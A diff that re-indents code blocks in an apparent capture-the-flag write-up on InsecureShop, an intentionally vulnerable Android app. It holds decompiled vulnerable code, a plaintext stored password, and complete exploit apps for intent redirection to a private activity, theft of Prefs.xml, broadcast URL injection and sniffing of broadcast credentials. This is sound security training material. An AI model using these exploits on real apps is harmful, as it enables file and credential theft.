@@ -69,22 +69,22 @@ If we looked again at the code of the `LoginActivity` we will notice that the us
 
 ```java
 public final void onLogin(View view) {
-        if (Util.INSTANCE.verifyUserNamePassword(username, password)) {
-            // defining the Prefs
-            Prefs prefs = Prefs.INSTANCE;
-            Context applicationContext = getApplicationContext();
-            Intrinsics.checkExpressionValueIsNotNull(applicationContext, "applicationContext");
-            // Adding the username to the Prefs
-            prefs.getInstance(applicationContext).setUsername(username);
-            Prefs prefs2 = Prefs.INSTANCE;
-            Context applicationContext2 = getApplicationContext();
-            Intrinsics.checkExpressionValueIsNotNull(applicationContext2, "applicationContext");
-            // Adding the password to the Prefs
-            prefs2.getInstance(applicationContext2).setPassword(password);
-            Util.saveProductList$default(Util.INSTANCE, this, null, 2, null);
-            startActivity(new Intent(this, ProductListActivity.class));
-            return;
-        }
+if (Util.INSTANCE.verifyUserNamePassword(username, password)) {
+    // defining the Prefs
+    Prefs prefs = Prefs.INSTANCE;
+    Context applicationContext = getApplicationContext();
+    Intrinsics.checkExpressionValueIsNotNull(applicationContext, "applicationContext");
+    // Adding the username to the Prefs
+    prefs.getInstance(applicationContext).setUsername(username);
+    Prefs prefs2 = Prefs.INSTANCE;
+    Context applicationContext2 = getApplicationContext();
+    Intrinsics.checkExpressionValueIsNotNull(applicationContext2, "applicationContext");
+    // Adding the password to the Prefs
+    prefs2.getInstance(applicationContext2).setPassword(password);
+    Util.saveProductList$default(Util.INSTANCE, this, null, 2, null);
+    startActivity(new Intent(this, ProductListActivity.class));
+    return;
+    }
 }
 ```
 
@@ -105,9 +105,9 @@ WebViewChromiumPrefs.xml
 root@generic_x86:/data/data/com.insecureshop/shared_prefs $ cat Prefs.xml                                                                  <
 <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
 <map>
-    <string name="username">shopuser</string>
-    <string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
-    <string name="password">!ns3csh0p</string>
+<string name="username">shopuser</string>
+<string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
+<string name="password">!ns3csh0p</string>
 </map>
 ```
 
@@ -133,33 +133,33 @@ Let’s examine the actual code of the `WebViewActivity` class:
 ```java
 public final class WebViewActivity extends AppCompatActivity {
 // ...........some code truncated............. 
-    @Override
-    public void onCreate(Bundle savedInstanceState) {
-            // ...........some code truncated............. 
-        Intent intent = getIntent();
-        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
-        Uri uri = intent.getData();
-        if (uri != null) {
-            String data = null;
-            data = null;
-            // ...........some code truncated............. 
-            // Checking if the Path of the URL contains "/web"
-            if (StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)) {
-                Intent intent2 = getIntent();
-                Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
-                Uri data2 = intent2.getData();
-                if (data2 != null) {
-                    data = data2.getQueryParameter("url");
-                }
+@Override
+public void onCreate(Bundle savedInstanceState) {
+    // ...........some code truncated............. 
+    Intent intent = getIntent();
+    Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
+    Uri uri = intent.getData();
+    if (uri != null) {
+        String data = null;
+        data = null;
+        // ...........some code truncated............. 
+        // Checking if the Path of the URL contains "/web"
+        if (StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)) {
+            Intent intent2 = getIntent();
+            Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
+            Uri data2 = intent2.getData();
+            if (data2 != null) {
+                data = data2.getQueryParameter("url");
             }
-            // ...........some code truncated............. 
-            if (data == null) {
-                finish();
-            }
-            webview.loadUrl(data);
-            Prefs.INSTANCE.getInstance(this).setData(data);
         }
+        // ...........some code truncated............. 
+        if (data == null) {
+            finish();
+        }
+        webview.loadUrl(data);
+        Prefs.INSTANCE.getInstance(this).setData(data);
     }
+}
 }
 ```
 
@@ -197,47 +197,47 @@ This challenge is similar to the previous one, but it wants us to bypass the hos
 ```java
 
 public final class WebViewActivity extends AppCompatActivity {
-  // ...........some code truncated.............
-    @Override 
-    public void onCreate(Bundle savedInstanceState) {
-      // ...........some code truncated.............
-        Intent intent = getIntent();
-        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
-        Uri uri = intent.getData();
-        if (uri != null) {
-            String data = null;
-            data = null;
-            }
-             // ...........some code truncated............. 
-            // Checking if the Path of the URL contains "/webview"
-            else if (StringsKt.equals$default(uri.getPath(), "/webview", false, 2, null)) {
-                Intent intent3 = getIntent();
-                Intrinsics.checkExpressionValueIsNotNull(intent3, "intent");
-                Uri data3 = intent3.getData();
-                if (data3 == null) {
-                    Intrinsics.throwNpe();
-                }
-                String queryParameter = data3.getQueryParameter("url");
-                if (queryParameter == null) {
-                    Intrinsics.throwNpe();
-                }
-                Intrinsics.checkExpressionValueIsNotNull(queryParameter, "intent.data!!.getQueryParameter(\"url\")!!");
-                if (StringsKt.endsWith$default(queryParameter, "insecureshopapp.com", false, 2, (Object) null)) {
-                    Intent intent4 = getIntent();
-                    Intrinsics.checkExpressionValueIsNotNull(intent4, "intent");
-                    Uri data4 = intent4.getData();
-                    if (data4 != null) {
-                        data = data4.getQueryParameter("url");
-                    }
-                }
-            }
-            if (data == null) {
-                finish();
-            }
-            webview.loadUrl(data);
-            Prefs.INSTANCE.getInstance(this).setData(data);
+// ...........some code truncated.............
+@Override 
+public void onCreate(Bundle savedInstanceState) {
+    // ...........some code truncated.............
+    Intent intent = getIntent();
+    Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
+    Uri uri = intent.getData();
+    if (uri != null) {
+        String data = null;
+        data = null;
         }
+            // ...........some code truncated............. 
+        // Checking if the Path of the URL contains "/webview"
+        else if (StringsKt.equals$default(uri.getPath(), "/webview", false, 2, null)) {
+            Intent intent3 = getIntent();
+            Intrinsics.checkExpressionValueIsNotNull(intent3, "intent");
+            Uri data3 = intent3.getData();
+            if (data3 == null) {
+                Intrinsics.throwNpe();
+            }
+            String queryParameter = data3.getQueryParameter("url");
+            if (queryParameter == null) {
+                Intrinsics.throwNpe();
+            }
+            Intrinsics.checkExpressionValueIsNotNull(queryParameter, "intent.data!!.getQueryParameter(\"url\")!!");
+            if (StringsKt.endsWith$default(queryParameter, "insecureshopapp.com", false, 2, (Object) null)) {
+                Intent intent4 = getIntent();
+                Intrinsics.checkExpressionValueIsNotNull(intent4, "intent");
+                Uri data4 = intent4.getData();
+                if (data4 != null) {
+                    data = data4.getQueryParameter("url");
+                }
+            }
+        }
+        if (data == null) {
+            finish();
+        }
+        webview.loadUrl(data);
+        Prefs.INSTANCE.getInstance(this).setData(data);
     }
+}
 }
 ```
 
@@ -279,17 +279,17 @@ As the challenge description suggests, there should be an intent being passed to
 Let’s review the code:
 
 ```java
-   public void onCreate(Bundle savedInstanceState) { 
-        super.onCreate(savedInstanceState);
-        setContentView(C0893R.layout.activity_webview);
-        setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
-        setTitle(getString(C0893R.string.webview));
-        Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
-        if (extraIntent != null) {
-            startActivity(extraIntent);
-            finish();
-            return;
-        }
+public void onCreate(Bundle savedInstanceState) { 
+    super.onCreate(savedInstanceState);
+    setContentView(C0893R.layout.activity_webview);
+    setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
+    setTitle(getString(C0893R.string.webview));
+    Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
+    if (extraIntent != null) {
+        startActivity(extraIntent);
+        finish();
+        return;
+}
 ```
 
 Here is, the code is waiting to receive an Intent with the key `extra_intent` but the dangerous part here is that the received intent is being passed to the `startActivity` function, which will allow us to access any intent in the application even if it is not exported. Let’s search for an activity like that in our app:
@@ -299,42 +299,42 @@ Here is, the code is waiting to receive an Intent with the key `extra_intent` bu
 ```
 
 ```java
-    public void onCreate(Bundle savedInstanceState) {
-        String data = getIntent().getStringExtra("url");
-        if (data == null) {
-            data = "https://www.insecureshopapp.com"; 
-        }
-        webview.loadUrl(data);
-        Prefs.INSTANCE.getInstance(this).setData(data);
+public void onCreate(Bundle savedInstanceState) {
+    String data = getIntent().getStringExtra("url");
+    if (data == null) {
+        data = "https://www.insecureshopapp.com"; 
     }
+    webview.loadUrl(data);
+    Prefs.INSTANCE.getInstance(this).setData(data);
+}
 ```
 
 Here is, the `PrivateActivity` is an unexported activity that cannot be accessed directly, so we can exploit the vulnerability that arises in the `WebView2Activity` to access it. We have two ways to exploit it, using the ADB AM or by creating an exploit application. Unfortunately, I have tried a lot with the am command, but I couldn’t figure out the correct command. So let’s create an exploit app. I will create an app with an empty activity through Android Studio and add the following code:
 
 ```java
 public class MainActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        Button IntentButton = (Button) findViewById(R.id.IntentButton);
-        // Set a click listener to send the intent
-        IntentButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-            // Making an Intent to the PrivateActivity with the extra "url"
-                Intent privateActivityIntent = new Intent();
-                privateActivityIntent.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
-                privateActivityIntent.putExtra("url", "https://itsfading.github.io");
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    Button IntentButton = (Button) findViewById(R.id.IntentButton);
+    // Set a click listener to send the intent
+    IntentButton.setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+        // Making an Intent to the PrivateActivity with the extra "url"
+            Intent privateActivityIntent = new Intent();
+            privateActivityIntent.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
+            privateActivityIntent.putExtra("url", "https://itsfading.github.io");
 
-            // Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class
-                Intent webViewIntent = new Intent();
-                webViewIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
-                webViewIntent.putExtra("extra_intent", privateActivityIntent); 
-                startActivity(webViewIntent);
-            }
-        });
-    }
+        // Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class
+            Intent webViewIntent = new Intent();
+            webViewIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
+            webViewIntent.putExtra("extra_intent", privateActivityIntent); 
+            startActivity(webViewIntent);
+        }
+    });
+}
 }
 ```
 
@@ -379,78 +379,78 @@ Let’s review the code of the `ChooserActivity`.
 
 ```java
 public final class ChooserActivity extends AppCompatActivity {
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(C0893R.layout.activity_chooser);
-        Intent intent = getIntent();
-        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
-        if (intent.getExtras() != null) {
-            Parcelable parcelableExtra = getIntent().getParcelableExtra("android.intent.extra.STREAM");
-            if (parcelableExtra != null) {
-                Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()));
-                Intrinsics.checkExpressionValueIsNotNull(uri, "Uri.fromFile(File(uri.toString()))");
-                makeTempCopy(uri, getFilename(uri));
-                return;
-            }
-            throw new TypeCastException("null cannot be cast to non-null type android.net.Uri");
+public void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(C0893R.layout.activity_chooser);
+    Intent intent = getIntent();
+    Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
+    if (intent.getExtras() != null) {
+        Parcelable parcelableExtra = getIntent().getParcelableExtra("android.intent.extra.STREAM");
+        if (parcelableExtra != null) {
+            Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()));
+            Intrinsics.checkExpressionValueIsNotNull(uri, "Uri.fromFile(File(uri.toString()))");
+            makeTempCopy(uri, getFilename(uri));
+            return;
         }
+        throw new TypeCastException("null cannot be cast to non-null type android.net.Uri");
     }
+}
 
-    private final Uri makeTempCopy(Uri fileUri, String original_filename) {
-        try {
-            StringBuilder sb = new StringBuilder();
-            File externalStorageDirectory = Environment.getExternalStorageDirectory();
-            Intrinsics.checkExpressionValueIsNotNull(externalStorageDirectory, "Environment.getExternalStorageDirectory()");
-            sb.append(externalStorageDirectory.getAbsolutePath());
-            sb.append(File.separator);
-            sb.append("insecureshop");
-            String path = sb.toString();
-            File directory = new File(path);
-            if (!directory.exists()) {
-                directory.mkdirs();
-            }
-            File fileTemp = new File(path, original_filename);
-            fileTemp.createNewFile();
-            Uri fromFile = Uri.fromFile(fileTemp);
-            InputStream openInputStream = getContentResolver().openInputStream(fileUri);
-            OutputStream openOutputStream = getContentResolver().openOutputStream(fromFile);
-            byte[] bArr = new byte[8192];
-            while (true) {
-                Integer len = openInputStream != null ? Integer.valueOf(openInputStream.read(bArr)) : null;
-                if (len != null && len.intValue() == -1) {
-                }
-                if (len != null) {
-                    int it = len.intValue();
-                    if (openOutputStream != null) {
-                        openOutputStream.write(bArr, 0, it);
-                    }
-                }
-            }
-        } catch (Exception e) {
-            return null;
+private final Uri makeTempCopy(Uri fileUri, String original_filename) {
+    try {
+        StringBuilder sb = new StringBuilder();
+        File externalStorageDirectory = Environment.getExternalStorageDirectory();
+        Intrinsics.checkExpressionValueIsNotNull(externalStorageDirectory, "Environment.getExternalStorageDirectory()");
+        sb.append(externalStorageDirectory.getAbsolutePath());
+        sb.append(File.separator);
+        sb.append("insecureshop");
+        String path = sb.toString();
+        File directory = new File(path);
+        if (!directory.exists()) {
+            directory.mkdirs();
         }
+        File fileTemp = new File(path, original_filename);
+        fileTemp.createNewFile();
+        Uri fromFile = Uri.fromFile(fileTemp);
+        InputStream openInputStream = getContentResolver().openInputStream(fileUri);
+        OutputStream openOutputStream = getContentResolver().openOutputStream(fromFile);
+        byte[] bArr = new byte[8192];
+        while (true) {
+            Integer len = openInputStream != null ? Integer.valueOf(openInputStream.read(bArr)) : null;
+            if (len != null && len.intValue() == -1) {
+            }
+            if (len != null) {
+                int it = len.intValue();
+                if (openOutputStream != null) {
+                    openOutputStream.write(bArr, 0, it);
+                }
+            }
+        }
+    } catch (Exception e) {
+        return null;
     }
+}
 
-    public final String getFilename(Uri uri) {
-        Intrinsics.checkParameterIsNotNull(uri, "uri");
-        String fileName = null;
-        Context context = getApplicationContext();
-        String scheme = uri.getScheme();
-        if (Intrinsics.areEqual(scheme, "file")) {
-            return uri.getLastPathSegment();
-        }
-        if (!Intrinsics.areEqual(scheme, "content")) {
-            return fileName;
-        }
-        Intrinsics.checkExpressionValueIsNotNull(context, "context");
-        Cursor cursor = context.getContentResolver().query(uri, new String[]{"_display_name"}, null, null, null);
-        if (cursor == null || cursor.getCount() == 0) {
-            return fileName;
-        }
-        int columnIndex = cursor.getColumnIndexOrThrow("_display_name");
-        cursor.moveToFirst();
-        return cursor.getString(columnIndex);
+public final String getFilename(Uri uri) {
+    Intrinsics.checkParameterIsNotNull(uri, "uri");
+    String fileName = null;
+    Context context = getApplicationContext();
+    String scheme = uri.getScheme();
+    if (Intrinsics.areEqual(scheme, "file")) {
+        return uri.getLastPathSegment();
     }
+    if (!Intrinsics.areEqual(scheme, "content")) {
+        return fileName;
+    }
+    Intrinsics.checkExpressionValueIsNotNull(context, "context");
+    Cursor cursor = context.getContentResolver().query(uri, new String[]{"_display_name"}, null, null, null);
+    if (cursor == null || cursor.getCount() == 0) {
+        return fileName;
+    }
+    int columnIndex = cursor.getColumnIndexOrThrow("_display_name");
+    cursor.moveToFirst();
+    return cursor.getString(columnIndex);
+}
 }
 ```
 
@@ -474,28 +474,28 @@ Based upon the above information, let’s create an exploit app with following c
 
 ```java
 public class MainActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        Button TheftofArbitraryFilesButton = (Button) findViewById(R.id.TheftofArbitraryFiles);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    Button TheftofArbitraryFilesButton = (Button) findViewById(R.id.TheftofArbitraryFiles);
 
-        // Set a click listener to send the intent
-        TheftofArbitraryFilesButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                Intent StealingFile = new Intent();
-                // Selecting the ChooserActivity
-                StealingFile.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity");
-                // Specfiying the Prefs.xml file
-                Uri FileName = Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
-                // adding the EXTRA_STREAM as an extra to trigger the exported Intent
-                StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);
-                // Starting the Intent
-                startActivity(StealingFile);
-            }
-        });
-    }
+    // Set a click listener to send the intent
+    TheftofArbitraryFilesButton.setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+            Intent StealingFile = new Intent();
+            // Selecting the ChooserActivity
+            StealingFile.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity");
+            // Specfiying the Prefs.xml file
+            Uri FileName = Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
+            // adding the EXTRA_STREAM as an extra to trigger the exported Intent
+            StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);
+            // Starting the Intent
+            startActivity(StealingFile);
+        }
+    });
+}
 }
 ```
 
@@ -533,46 +533,47 @@ While reviewing the classes, I found that there is a class named `com.insecuresh
 
 ```java
 public final class CustomReceiver extends BroadcastReceiver {
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        Bundle extras;
-        String stringExtra = (intent == null || (extras = intent.getExtras()) == null) ? null : extras.getString("web_url");
-        String str = stringExtra;
-        if (!(str == null || StringsKt.isBlank(str))) {
-            Intent intent2 = new Intent(context, WebView2Activity.class);
-            intent2.putExtra("url", stringExtra);
-            if (context != null) {
-                context.startActivity(intent2);
-            }
+@Override // android.content.BroadcastReceiver
+public void onReceive(Context context, Intent intent) {
+    Bundle extras;
+    String stringExtra = (intent == null || (extras = intent.getExtras()) == null) ? null : extras.getString("web_url");
+    String str = stringExtra;
+    if (!(str == null || StringsKt.isBlank(str))) {
+        Intent intent2 = new Intent(context, WebView2Activity.class);
+        intent2.putExtra("url", stringExtra);
+        if (context != null) {
+            context.startActivity(intent2);
         }
     }
+}
+}
 ```
 
 Here, the `onRecive` method is defining what will happen when a broadcast Intent/message is received. It will look for a key `web_url` and the value for it will be passed to the `WebView2Activity` to display this URL. But to trigger this broadcast, we first need to search where this custom receiver is being used. A quick search will reveal that `com.insecureshop.AboutUsActivity` is using it. Let’s examine its code:
 
 ```java
 public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(C0893R.layout.activity_about_us);
-        // Custom receiver object created
-        CustomReceiver customReceiver = new CustomReceiver();
-        this.receiver = customReceiver;
-        if (customReceiver == null) {
-            Intrinsics.throwUninitializedPropertyAccessException("receiver");
-        }
-        // registering the reciever with a specific Intent
-        registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));
+    super.onCreate(savedInstanceState);
+    setContentView(C0893R.layout.activity_about_us);
+    // Custom receiver object created
+    CustomReceiver customReceiver = new CustomReceiver();
+    this.receiver = customReceiver;
+    if (customReceiver == null) {
+        Intrinsics.throwUninitializedPropertyAccessException("receiver");
     }
+    // registering the reciever with a specific Intent
+    registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));
+}
 
-    @Override
-    public void onDestroy() {
-        CustomReceiver customReceiver = this.receiver;
-        if (customReceiver == null) {
-            Intrinsics.throwUninitializedPropertyAccessException("receiver");
-        }
-        unregisterReceiver(customReceiver);
-        super.onDestroy();
+@Override
+public void onDestroy() {
+    CustomReceiver customReceiver = this.receiver;
+    if (customReceiver == null) {
+        Intrinsics.throwUninitializedPropertyAccessException("receiver");
     }
+    unregisterReceiver(customReceiver);
+    super.onDestroy();
+}
 ```
 
 Let’s break it down:
@@ -610,32 +611,32 @@ We can also create an exploit app with the following code:
 ```java
 public class YourActivity extends AppCompatActivity {
 
-    private Context context; // Make sure to initialize this context appropriately
-    public void insecureBroadcast(View view) {
-        // Create an Intent to start the activity
-        Intent intent = new Intent();
-        intent.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
-        startActivity(intent);
+private Context context; // Make sure to initialize this context appropriately
+public void insecureBroadcast(View view) {
+    // Create an Intent to start the activity
+    Intent intent = new Intent();
+    intent.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
+    startActivity(intent);
 
-        // Delay the broadcast by 1 second
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                delayedBroadcast();
-            }
-        }, 1000);
-    }
-
-    private void delayedBroadcast() {
-        // Create an Intent for the broadcast
-        Intent WebViewintent = new Intent("com.insecureshop.CUSTOM_INTENT");
-        WebViewintent.putExtra("web_url", "https://itsfading.github.io");
-        
-        // Send the broadcast
-        if (context != null) {
-            context.sendBroadcast(WebViewintent);
+    // Delay the broadcast by 1 second
+    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+        @Override
+        public void run() {
+            delayedBroadcast();
         }
+    }, 1000);
+}
+
+private void delayedBroadcast() {
+    // Create an Intent for the broadcast
+    Intent WebViewintent = new Intent("com.insecureshop.CUSTOM_INTENT");
+    WebViewintent.putExtra("web_url", "https://itsfading.github.io");
+    
+    // Send the broadcast
+    if (context != null) {
+        context.sendBroadcast(WebViewintent);
     }
+}
 }
 ```
 
@@ -647,22 +648,22 @@ In the same activity as before, `AboutUsActivity` there is the use of a dynamic 
 
 ```java
  public final void onSendData(View view) {
-        Intrinsics.checkParameterIsNotNull(view, "view");
-        String userName = Prefs.INSTANCE.getUsername();
-        if (userName == null) {
-            Intrinsics.throwNpe();
-        }
-        String password = Prefs.INSTANCE.getPassword();
-        if (password == null) {
-            Intrinsics.throwNpe();
-        }
-        Intent intent = new Intent("com.insecureshop.action.BROADCAST");
-        intent.putExtra("username", userName);
-        intent.putExtra("password", password);
-        sendBroadcast(intent);
-        TextView textView = (TextView) _$_findCachedViewById(C0893R.C0896id.textView);
-        Intrinsics.checkExpressionValueIsNotNull(textView, "textView");
-        textView.setText("InsecureShop is an intentionally designed vulnerable android app built in Kotlin.");
+    Intrinsics.checkParameterIsNotNull(view, "view");
+    String userName = Prefs.INSTANCE.getUsername();
+    if (userName == null) {
+        Intrinsics.throwNpe();
+    }
+    String password = Prefs.INSTANCE.getPassword();
+    if (password == null) {
+        Intrinsics.throwNpe();
+    }
+    Intent intent = new Intent("com.insecureshop.action.BROADCAST");
+    intent.putExtra("username", userName);
+    intent.putExtra("password", password);
+    sendBroadcast(intent);
+    TextView textView = (TextView) _$_findCachedViewById(C0893R.C0896id.textView);
+    Intrinsics.checkExpressionValueIsNotNull(textView, "textView");
+    textView.setText("InsecureShop is an intentionally designed vulnerable android app built in Kotlin.");
     }
 ```
 
@@ -670,30 +671,30 @@ But this time, only the `sendBroadcast` function is being implemented without `o
 
 ```java
 public class MainActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
 
-        // starting the AboutUs Activity to trigger the sendBroadcast
-        Intent triggerBroadCast = new Intent();
-        triggerBroadCast.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
-        startActivity(triggerBroadCast);
+    // starting the AboutUs Activity to trigger the sendBroadcast
+    Intent triggerBroadCast = new Intent();
+    triggerBroadCast.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
+    startActivity(triggerBroadCast);
 
-       BroadcastReceiver receiver = new BroadcastReceiver() {
-           @Override
-           // Once a broadcast received with a specific intent
-           public void onReceive(Context context, Intent intent) {
-                      // Geting the value from the defined extras
-                String username = intent.getStringExtra("username");
-                String password = intent.getStringExtra("password");
-                Log.d("userName: ", username);
-                Log.d("password: ", password);
-           }
-       };
-       // Waiting for any broadcast with this intent "com.insecureshop.action.BROADCAST"
-       registerReceiver(receiver, new IntentFilter("com.insecureshop.action.BROADCAST"));
-    }
+    BroadcastReceiver receiver = new BroadcastReceiver() {
+        @Override
+        // Once a broadcast received with a specific intent
+        public void onReceive(Context context, Intent intent) {
+                    // Geting the value from the defined extras
+            String username = intent.getStringExtra("username");
+            String password = intent.getStringExtra("password");
+            Log.d("userName: ", username);
+            Log.d("password: ", password);
+        }
+    };
